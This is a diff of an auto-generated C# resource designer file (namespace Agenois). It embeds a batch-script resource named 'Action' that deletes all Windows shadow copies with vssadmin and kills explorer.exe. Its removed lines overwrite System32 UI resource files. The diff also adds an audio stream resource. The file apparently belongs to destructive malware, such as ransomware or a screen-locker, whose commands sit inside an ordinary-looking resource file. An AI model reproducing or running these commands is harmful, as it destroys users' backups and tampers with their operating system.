@@ -70,12 +70,21 @@ namespace Agenois.Properties {
         ///vssadmin delete shadows /all /Quiet
         ///taskkill /f /im explorer.exe
         ///TIMEOUT 1
-        ///copy &quot;C:\Windows\Defender\authui.dll.mui&quot; &quot;C:\Windows\System32\en-US\authui.dll.mui&quot; /Y
-        ///copy &quot;C:\Windows\Defender\explorer.exe.mui&quot; &quot;C:\Wind [rest of string was truncated]&quot;;.
+        ///
+        ///.
         /// </summary>
         internal static string Action {
             get {
                 return ResourceManager.GetString("Action", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.IO.UnmanagedMemoryStream similar to System.IO.MemoryStream.
+        /// </summary>
+        internal static System.IO.UnmanagedMemoryStream Audio {
+            get {
+                return ResourceManager.GetStream("Audio", resourceCulture);
             }
         }
         
